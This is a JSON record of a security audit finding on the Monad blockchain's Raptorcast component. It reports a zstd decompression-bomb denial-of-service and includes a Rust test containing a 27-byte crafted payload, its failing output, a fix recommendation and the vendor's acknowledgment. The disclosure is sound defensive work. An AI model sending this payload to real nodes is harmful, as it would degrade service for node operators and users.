@@ -1,0 +1,60 @@
+{
+    "id": 62886,
+    "kind": "PDF",
+    "auditfirm_id": 6,
+    "impact": "HIGH",
+    "finders_count": 4,
+    "protocol_id": 3419,
+    "title": "Raptorcast deserialization susceptible to zstd decompression bomb",
+    "content": "## Severity: High Risk\n## Context\nzstd.rs#L45\n\n## Description\nDeserialization of a (small) crafted input to Raptorcast's deserialization function can incur a high computational cost; approximately 0.5-1 second of processing time per 27 bytes of payload on modern hardware.\n\n## Proof of Concept\n```diff\ndiff --git a/monad-raptorcast/src/message.rs b/monad-raptorcast/src/message.rs\nindex 205c0a49..24b3906c 100644\n--- a/monad-raptorcast/src/message.rs\n+++ b/monad-raptorcast/src/message.rs\n@@ -256,6 +256,7 @@ impl<M: Decodable, ST: CertificateSignatureRecoverable> InboundRouterMessage<M,\n mod tests {\n use bytes::BytesMut;\n use monad_secp::SecpSignature;\n+ use std::time::{Duration, Instant};\n use rstest::*;\n use super::*;\n@@ -443,4 +444,20 @@ mod tests {\n _ => panic!(\"expected AppMessage variant\"),\n }\n }\n+\n+ #[test]\n+ fn test_deserialization_decompression_bomb() {\n+ let serialized = Bytes::from(&[\n+ 0xda, 0xc2, 0x5d, 0x02, 0x01, 0x23, 0x94, 0x28, 0xb5, 0x2f, 0xfd, 0x14,\n+ 0x88, 0x5d, 0x00, 0x00, 0xdd, 0xf9, 0x1f, 0x06, 0xfd, 0x40, 0x14, 0x02,\n+ 0x30, 0x07, 0x4f\n+ ][..]);\n+\n+ let start = Instant::now();\n+ for _i in 1..100 {\n+ let _ = InboundRouterMessage::<TestMessage, SecpSignature>::try_deserialize(&serialized);\n+ }\n+ let duration = start.elapsed();\n+ assert!(duration < Duration::from_secs(1), \"Operation took too long: {:?}\", duration);\n+ }\n }\n```\n## Output\n```\nrunning 1 test\ntest message::tests::test_deserialization_decompression_bomb ... FAILED\nfailures:\n---- message::tests::test_deserialization_decompression_bomb stdout ----\nthread 'message::tests::test_deserialization_decompression_bomb' panicked at\nmonad-raptorcast/src/message.rs:461:9:↪→\nOperation took too long: 23.343895969s\nnote: run with RUST_BACKTRACE=1 environment variable to display a backtrace\nfailures:\nmessage::tests::test_deserialization_decompression_bomb\ntest result: FAILED. 0 passed; 1 failed; 0 ignored; 0 measured; 41 filtered out; finished in 23.34s\n```\nTested on \"AMD EPYC 9454P 48-Core Processor\".\n\n## Recommendation\nThe zstd decompressor (zstd.rs#L45) uses streaming decompression. Use bulk decompression instead, as this mode has a much lower worst case complexity.\n\n## Category Labs\nAcknowledged. ZSTD was intentionally disabled for mainnet launch to avoid running into this issue in PR 2184, and there is an internal issue to track this.\n\n## Spearbit\nAcknowledged.",
+    "summary": "\nThis bug report describes a high-risk issue in the Raptorcast deserialization function. When a specific input is provided, it can cause a significant amount of processing time, up to 0.5-1 second per 27 bytes of payload. This bug has been tested and confirmed on an AMD EPYC 9454P 48-Core Processor. The report recommends using bulk decompression instead of streaming decompression to avoid this issue. This bug has been acknowledged and there is an internal issue to track it.",
+    "report_date": "2025-09-19T00:00:00.000Z",
+    "contest_prize_txt": "",
+    "contest_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Monad-Spearbit-Security-Review-September-2025.pdf",
+    "sponsor_name": null,
+    "sponsor_link": "",
+    "quality_score": 0,
+    "general_score": 0,
+    "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Monad-Spearbit-Security-Review-September-2025.pdf",
+    "github_link": "",
+    "pdf_link": "https://solodit-bucket.s3.amazonaws.com/storage/reports/spearbit/Monad-Spearbit-Security-Review-September-2025.pdf",
+    "pdf_page_from": 9,
+    "contest_id": "",
+    "slug": "raptorcast-deserialization-susceptible-to-zstd-decompression-bomb-spearbit-none-monad-pdf",
+    "firm_name": "Spearbit",
+    "firm_logo_square": "spearbit_square.png",
+    "protocol_name": "Monad",
+    "bookmarked": false,
+    "read": false,
+    "issues_issue_finders": [
+        {
+            "wardens_warden": {
+                "handle": "Haxatron"
+            }
+        },
+        {
+            "wardens_warden": {
+                "handle": "Dtheo"
+            }
+        },
+        {
+            "wardens_warden": {
+                "handle": "Guido Vranken"
+            }
+        },
+        {
+            "wardens_warden": {
+                "handle": "Rikard Hjort"
+            }
+        }
+    ],
+    "auditfirms_auditfirm": {
+        "name": "Spearbit",
+        "logo_square": "spearbit_square.png"
+    },
+    "protocols_protocol": {
+        "name": "Monad",
+        "protocols_protocolcategoryscore": []
+    },
+    "issues_issuetagscore": []
+}
